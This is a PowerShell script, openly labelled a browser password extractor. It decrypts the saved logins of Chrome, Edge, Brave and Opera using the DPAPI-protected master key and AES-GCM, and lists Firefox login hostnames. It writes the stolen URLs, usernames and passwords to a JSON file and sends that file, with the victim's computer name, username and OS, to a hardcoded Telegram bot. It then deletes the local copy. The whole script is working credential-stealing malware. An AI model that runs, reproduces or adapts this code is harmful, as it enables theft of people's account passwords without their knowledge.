# Enhanced Multi-Browser Password Extractor with Python-like Decryption
# Supports Chrome, Edge, Brave, Opera, and Firefox

param(
    [string]$TelegramBotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w",
    [string]$TelegramChatID = "2146236602"
)

# Function to send message to Telegram
function Send-TelegramMessage {
    param(
        [string]$Message
    )
    
    try {
        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
        $body = @{
            chat_id = $TelegramChatID
            text = $Message
            parse_mode = "HTML"
        }
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
        
        if ($response.ok) {
            Write-Host "‚úÖ Message sent to Telegram" -ForegroundColor Green
            return $true
        } else {
            Write-Host "‚ùå Telegram API error: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "‚ùå Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to send files to Telegram
function Send-TelegramFile {
    param(
        [string]$FilePath,
        [string]$Caption
    )
    
    try {
        if (-not (Test-Path $FilePath)) {
            Write-Host "File not found: $FilePath" -ForegroundColor Red
            return $false
        }
        
        # Wait for file to be fully written
        $maxWaitTime = 30
        $waitTime = 0
        while ($waitTime -lt $maxWaitTime) {
            try {
                $file = Get-Item $FilePath
                $fileSize = $file.Length
                if ($fileSize -gt 0) {
                    break
                }
            } catch {}
            Start-Sleep -Seconds 1
            $waitTime++
        }
        
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $TelegramChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"caption`"",
            "",
            $Caption,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileContent,
            "--$boundary--"
        ) -join $LF

        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
        Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        
        if ($response.ok) {
            Write-Host "‚úÖ File sent to Telegram successfully: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
            return $true
        } else {
            Write-Host "‚ùå Telegram API error: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "‚ùå Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Browser Password Extractor Class
class BrowserPasswordExtractor {
    [hashtable]$browsers
    
    BrowserPasswordExtractor() {
        $this.browsers = @{
            "Chrome" = { $this.get_chrome_paths() }
            "Edge" = { $this.get_edge_paths() }
            "Brave" = { $this.get_brave_paths() }
            "Opera" = { $this.get_opera_paths() }
            "Firefox" = { $this.get_firefox_paths() }
        }
    }
    
    # Get Chrome profile paths
    [array]get_chrome_paths() {
        $base_path = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data"
        return $this._get_chromium_profiles($base_path)
    }
    
    # Get Microsoft Edge profile paths
    [array]get_edge_paths() {
        $base_path = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Edge\User Data"
        return $this._get_chromium_profiles($base_path)
    }
    
    # Get Brave browser profile paths
    [array]get_brave_paths() {
        $base_path = Join-Path $env:USERPROFILE "AppData\Local\BraveSoftware\Brave-Browser\User Data"
        return $this._get_chromium_profiles($base_path)
    }
    
    # Get Opera profile paths
    [array]get_opera_paths() {
        $base_path = Join-Path $env:USERPROFILE "AppData\Roaming\Opera Software\Opera Stable"
        $profiles = @()
        
        if (Test-Path $base_path) {
            $login_data = Join-Path $base_path "Login Data"
            if (Test-Path $login_data) {
                $profiles += @("Default", $base_path)
            }
        }
        return $profiles
    }
    
    # Get Firefox profile paths
    [array]get_firefox_paths() {
        $firefox_path = Join-Path $env:USERPROFILE "AppData\Roaming\Mozilla\Firefox\Profiles"
        $profiles = @()
        
        if (Test-Path $firefox_path) {
            $profile_dirs = Get-ChildItem -Path $firefox_path -Directory -Filter "*.default*"
            foreach ($profile_dir in $profile_dirs) {
                $profile_name = $profile_dir.Name
                $profiles += @($profile_name, $profile_dir.FullName)
            }
        }
        return $profiles
    }
    
    # Get profiles for Chromium-based browsers
    [array]_get_chromium_profiles([string]$base_path) {
        $profiles = @()
        
        if (Test-Path $base_path) {
            # Default profile
            $default_profile = Join-Path $base_path "Default"
            $default_login_data = Join-Path $default_profile "Login Data"
            if (Test-Path $default_login_data) {
                $profiles += @("Default", $default_profile)
            }
            
            # Other profiles
            $profile_dirs = Get-ChildItem -Path $base_path -Directory -Filter "Profile *"
            foreach ($profile_dir in $profile_dirs) {
                $login_data = Join-Path $profile_dir.FullName "Login Data"
                if (Test-Path $login_data) {
                    $profile_name = $profile_dir.Name
                    $profiles += @($profile_name, $profile_dir.FullName)
                }
            }
        }
        return $profiles
    }
    
    # Get encryption key for Chromium-based browsers
    [byte[]]get_encryption_key([string]$browser_path) {
        $local_state_path = Join-Path $browser_path "Local State"
        
        try {
            if (-not (Test-Path $local_state_path)) {
                Write-Host "    ‚ùå Local State file not found: $local_state_path" -ForegroundColor Red
                return $null
            }
            
            $local_state_content = Get-Content $local_state_path -Raw | ConvertFrom-Json
            $encrypted_key_base64 = $local_state_content.os_crypt.encrypted_key
            
            if (-not $encrypted_key_base64) {
                Write-Host "    ‚ùå No encrypted key found in Local State" -ForegroundColor Red
                return $null
            }
            
            # Decode base64
            $encrypted_key = [System.Convert]::FromBase64String($encrypted_key_base64)
            
            # Remove DPAPI prefix (first 5 bytes)
            if ($encrypted_key.Length -gt 5) {
                $encrypted_key = $encrypted_key[5..($encrypted_key.Length - 1)]
            }
            
            # Decrypt using DPAPI (Windows Data Protection API)
            # Note: In PowerShell, we use the Windows DPAPI through .NET
            Add-Type -AssemblyName System.Security
            
            try {
                $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $encrypted_key,
                    $null,
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                )
                
                Write-Host "    ‚úì Encryption key obtained successfully" -ForegroundColor Green
                return $decrypted_key
            } catch {
                Write-Host "    ‚ùå Error decrypting master key: $($_.Exception.Message)" -ForegroundColor Red
                return $null
            }
            
        } catch {
            Write-Host "    ‚ùå Error getting encryption key: $($_.Exception.Message)" -ForegroundColor Red
            return $null
        }
    }
    
    # Decrypt Chromium-based browser passwords
    [string]decrypt_chromium_password([byte[]]$encrypted_password, [byte[]]$key) {
        try {
            if (-not $encrypted_password -or $encrypted_password.Length -eq 0) {
                return $null
            }
            
            # Check if it's AES-GCM encrypted (starts with v10 or v20)
            if ($encrypted_password.Length -ge 3) {
                $prefix = [System.Text.Encoding]::ASCII.GetString($encrypted_password[0..2])
                
                if ($prefix -eq "v10" -or $prefix -eq "v20") {
                    # AES-GCM encryption
                    if ($encrypted_password.Length -lt 15) {
                        return $null
                    }
                    
                    # Extract IV (12 bytes after version prefix)
                    $iv = $encrypted_password[3..14]
                    
                    # Extract ciphertext (everything after IV and before tag)
                    $ciphertext_length = $encrypted_password.Length - 16 - 15
                    if ($ciphertext_length -le 0) {
                        return $null
                    }
                    
                    $ciphertext = $encrypted_password[15..($ciphertext_length + 14)]
                    
                    # Extract tag (last 16 bytes)
                    $tag = $encrypted_password[($encrypted_password.Length - 16)..($encrypted_password.Length - 1)]
                    
                    # Try to decrypt using AES-GCM
                    # Note: .NET Core 3.0+ or .NET 5.0+ required for AesGcm
                    try {
                        Add-Type -AssemblyName System.Security
                        
                        # Check if AesGcm is available
                        $aesGcmType = [System.Security.Cryptography.AesGcm]
                        if ($aesGcmType) {
                            $aes = New-Object System.Security.Cryptography.AesGcm($key)
                            $plaintext = New-Object byte[] $ciphertext.Length
                            $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
                            return [System.Text.Encoding]::UTF8.GetString($plaintext)
                        } else {
                            Write-Host "    ‚ö†Ô∏è AES-GCM requires .NET Core 3.0+ or .NET 5.0+" -ForegroundColor Yellow
                            # Fallback to DPAPI for older encryption
                            return $this._decrypt_with_dpapi($encrypted_password)
                        }
                    } catch {
                        Write-Host "    ‚ö†Ô∏è AES-GCM decryption failed: $($_.Exception.Message)" -ForegroundColor Yellow
                        # Fallback to DPAPI
                        return $this._decrypt_with_dpapi($encrypted_password)
                    }
                }
            }
            
            # Try DPAPI encryption for older versions
            return $this._decrypt_with_dpapi($encrypted_password)
            
        } catch {
            Write-Host "    ‚ö†Ô∏è Password decryption error: $($_.Exception.Message)" -ForegroundColor Yellow
            return $null
        }
    }
    
    # Helper method to decrypt using DPAPI
    [string]_decrypt_with_dpapi([byte[]]$encrypted_data) {
        try {
            Add-Type -AssemblyName System.Security
            
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $encrypted_data,
                $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        } catch {
            return $null
        }
    }
    
    # Extract Firefox passwords (simplified)
    [array]decrypt_firefox_password([string]$profile_path) {
        try {
            $signons_path = Join-Path $profile_path "signons.sqlite"
            $logins_path = Join-Path $profile_path "logins.json"
            
            $passwords = @()
            
            # Try old format (signons.sqlite)
            if (Test-Path $signons_path) {
                $temp_db = "temp_firefox.db"
                Copy-Item $signons_path $temp_db -Force
                
                try {
                    # Using SQLite in PowerShell (requires sqlite3.exe or System.Data.SQLite)
                    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
                    $conn.ConnectionString = "Data Source=$temp_db"
                    $conn.Open()
                    
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins"
                    
                    $reader = $cmd.ExecuteReader()
                    
                    while ($reader.Read()) {
                        $host = $reader.GetString(0)
                        
                        $passwords += @{
                            url = $host
                            username = "[Firefox - Requires Master Password]"
                            password = "[Firefox - Requires Master Password]"
                        }
                    }
                    
                    $reader.Close()
                    $cmd.Dispose()
                    $conn.Close()
                    $conn.Dispose()
                    
                } catch {
                    Write-Host "    ‚ùå Error reading Firefox database: $($_.Exception.Message)" -ForegroundColor Red
                } finally {
                    if (Test-Path $temp_db) {
                        Remove-Item $temp_db -Force
                    }
                }
            }
            # Try new format (logins.json)
            elseif (Test-Path $logins_path) {
                try {
                    $logins_data = Get-Content $logins_path -Raw | ConvertFrom-Json
                    
                    foreach ($login in $logins_data.logins) {
                        $passwords += @{
                            url = $login.hostname
                            username = "[Firefox - Encrypted]"
                            password = "[Firefox - Encrypted]"
                        }
                    }
                } catch {
                    Write-Host "    ‚ùå Error reading Firefox logins.json: $($_.Exception.Message)" -ForegroundColor Red
                }
            }
            
            return $passwords
            
        } catch {
            Write-Host "    ‚ùå Firefox decryption error: $($_.Exception.Message)" -ForegroundColor Red
            return @()
        }
    }
    
    # Extract passwords from Chromium-based browsers
    [array]extract_chromium_passwords([string]$browser_name, [string]$profile_name, [string]$profile_path, [byte[]]$key) {
        $db_path = Join-Path $profile_path "Login Data"
        
        if (-not (Test-Path $db_path)) {
            return @()
        }
        
        try {
            $temp_db = "temp_$($browser_name)_$($profile_name -replace '[^a-zA-Z0-9]', '_').db"
            Copy-Item $db_path $temp_db -Force
            
            $passwords = @()
            
            try {
                # Using SQLite in PowerShell
                $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
                $conn.ConnectionString = "Data Source=$temp_db"
                $conn.Open()
                
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                
                $reader = $cmd.ExecuteReader()
                
                $counter = 0
                while ($reader.Read()) {
                    $url = $reader.GetString(0)
                    $username = $reader.GetString(1)
                    
                    # Get password as bytes
                    $password_value = $null
                    try {
                        # Try to get as byte array
                        $password_value = $reader.GetValue(2)
                        if ($password_value -is [byte[]]) {
                            $encrypted_password = $password_value
                        } elseif ($password_value -is [System.DBNull]) {
                            $encrypted_password = $null
                        } else {
                            # Try to convert to byte array
                            $encrypted_password = [System.Text.Encoding]::UTF8.GetBytes($password_value.ToString())
                        }
                    } catch {
                        $encrypted_password = $null
                    }
                    
                    if ($encrypted_password) {
                        $password = $this.decrypt_chromium_password($encrypted_password, $key)
                        if ($password -and $username) {
                            $passwords += @{
                                url = $url
                                username = $username
                                password = $password
                            }
                            $counter++
                        }
                    }
                }
                
                Write-Host "      üìÅ $profile_name: $counter passwords" -ForegroundColor Green
                
                $reader.Close()
                $cmd.Dispose()
                $conn.Close()
                $conn.Dispose()
                
            } catch {
                Write-Host "    ‚ùå Error reading database: $($_.Exception.Message)" -ForegroundColor Red
            } finally {
                if (Test-Path $temp_db) {
                    Remove-Item $temp_db -Force
                }
            }
            
            return $passwords
            
        } catch {
            Write-Host "    ‚ùå Error extracting from $browser_name: $($_.Exception.Message)" -ForegroundColor Red
            return @()
        }
    }
    
    # Scan all browsers for passwords
    [hashtable]scan_all_browsers() {
        Write-Host "üåê Multi-Browser Password Extractor" -ForegroundColor Cyan
        Write-Host "=" * 60 -ForegroundColor Cyan
        Write-Host "Scanning all major browsers..." -ForegroundColor Yellow
        Write-Host ""
        
        $all_results = @{}
        
        foreach ($browser_name in $this.browsers.Keys) {
            Write-Host "üîç Scanning $browser_name..." -ForegroundColor Yellow
            
            try {
                $profile_func = $this.browsers[$browser_name]
                $profiles = & $profile_func
                
                if (-not $profiles -or $profiles.Count -eq 0) {
                    Write-Host "   ‚ùå $browser_name not found or no profiles" -ForegroundColor Red
                    continue
                }
                
                Write-Host "   ‚úì Found $($profiles.Count / 2) profile(s)" -ForegroundColor Green
                
                $browser_passwords = @()
                
                # Process each profile (pairs of name and path)
                for ($i = 0; $i -lt $profiles.Count; $i += 2) {
                    $profile_name = $profiles[$i]
                    $profile_path = $profiles[$i + 1]
                    
                    if ($browser_name -eq "Firefox") {
                        # Firefox uses different encryption
                        $passwords = $this.decrypt_firefox_password($profile_path)
                    } else {
                        # Chromium-based browsers
                        $browser_data_path = Split-Path $profile_path -Parent
                        $key = $this.get_encryption_key($browser_data_path)
                        if (-not $key) {
                            continue
                        }
                        $passwords = $this.extract_chromium_passwords($browser_name, $profile_name, $profile_path, $key)
                    }
                    
                    $browser_passwords += $passwords
                }
                
                $all_results[$browser_name] = $browser_passwords
                Write-Host "   ‚úÖ $browser_name: $($browser_passwords.Count) total passwords" -ForegroundColor Green
                
            } catch {
                Write-Host "   ‚ùå Error scanning $browser_name`: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            Write-Host ""
        }
        
        return $all_results
    }
    
    # Display extracted passwords
    [void]display_results([hashtable]$results) {
        Write-Host "üìã EXTRACTION RESULTS" -ForegroundColor Cyan
        Write-Host "=" * 80 -ForegroundColor Cyan
        
        $total_passwords = 0
        foreach ($browser_name in $results.Keys) {
            $passwords = $results[$browser_name]
            
            if ($passwords -and $passwords.Count -gt 0) {
                Write-Host "`nüñ•Ô∏è  $($browser_name.ToUpper()) ($($passwords.Count) passwords):" -ForegroundColor Yellow
                Write-Host "-" * 60 -ForegroundColor Gray
                
                # Show first 10 entries
                $max_to_show = [Math]::Min(10, $passwords.Count)
                for ($i = 0; $i -lt $max_to_show; $i++) {
                    $entry = $passwords[$i]
                    Write-Host "  $($i+1):2. üåê $($entry.url)" -ForegroundColor White
                    Write-Host "      üë§ $($entry.username)" -ForegroundColor Gray
                    Write-Host "      üîë $($entry.password)" -ForegroundColor Green
                }
                
                if ($passwords.Count -gt 10) {
                    Write-Host "  ... and $($passwords.Count - 10) more passwords" -ForegroundColor Gray
                }
                
                $total_passwords += $passwords.Count
            }
        }
        
        $browsers_with_passwords = ($results.Keys | Where-Object { $results[$_].Count -gt 0 }).Count
        Write-Host "`nüìä SUMMARY: Found $total_passwords total passwords across $browsers_with_passwords browsers" -ForegroundColor Cyan
        
        # Save to file
        $this.save_to_file($results)
    }
    
    # Save results to JSON file
    [void]save_to_file([hashtable]$results) {
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $filename = "browser_passwords_${timestamp}.json"
        
        # Convert to serializable format
        $serializable_results = @{}
        foreach ($browser in $results.Keys) {
            $serializable_results[$browser] = $results[$browser]
        }
        
        try {
            $serializable_results | ConvertTo-Json -Depth 10 | Out-File -FilePath $filename -Encoding UTF8
            Write-Host "üíæ Results saved to: $filename" -ForegroundColor Green
            
            # Send to Telegram if configured
            if ($TelegramBotToken -and $TelegramChatID) {
                $caption = "Browser Passwords Extracted`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`nTotal: $total_passwords passwords"
                Send-TelegramFile -FilePath $filename -Caption $caption | Out-Null
                
                # Clean up file after sending
                Start-Sleep -Seconds 2
                if (Test-Path $filename) {
                    Remove-Item $filename -Force
                }
            }
            
        } catch {
            Write-Host "‚ùå Error saving to file: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    # Main method
    [void]main() {
        Write-Host "üöÄ Starting Multi-Browser Password Extraction..." -ForegroundColor Green
        Write-Host "‚ö†Ô∏è  Make sure all browsers are closed before running!" -ForegroundColor Yellow
        Write-Host ""
        
        # Check if System.Data.SQLite assembly is available for database operations
        try {
            Add-Type -Path "System.Data.SQLite.dll" -ErrorAction Stop
        } catch {
            Write-Host "‚ö†Ô∏è  System.Data.SQLite not found. Attempting to download..." -ForegroundColor Yellow
            
            try {
                # Download SQLite interop DLL
                $sqliteUrl = "https://www.sqlite.org/2023/sqlite-dll-win32-x86-3440200.zip"
                $tempZip = "sqlite-dll.zip"
                
                Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
                Expand-Archive -Path $tempZip -DestinationPath "." -Force
                
                # Also try to load System.Data.SQLite from NuGet or local
                Write-Host "‚úì SQLite DLL downloaded. Manual assembly load may be required." -ForegroundColor Green
            } catch {
                Write-Host "‚ùå Failed to download SQLite. Some features may not work." -ForegroundColor Red
            }
        }
        
        $results = $this.scan_all_browsers()
        $this.display_results($results)
    }
}

# Main execution
function Main {
    # Send start message to Telegram
    $startMessage = @"
üöÄ Starting Browser Password Extraction
‚Ä¢ Computer: $env:COMPUTERNAME
‚Ä¢ User: $env:USERNAME
‚Ä¢ Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
‚Ä¢ OS: $((Get-WmiObject -Class Win32_OperatingSystem).Caption)
"@
    
    Send-TelegramMessage -Message $startMessage | Out-Null
    
    # Create extractor and run
    $extractor = [BrowserPasswordExtractor]::new()
    $extractor.main()
    
    # Send completion message
    $completionMessage = "‚úÖ Browser password extraction completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Send-TelegramMessage -Message $completionMessage | Out-Null
}

# Execute main function
Main
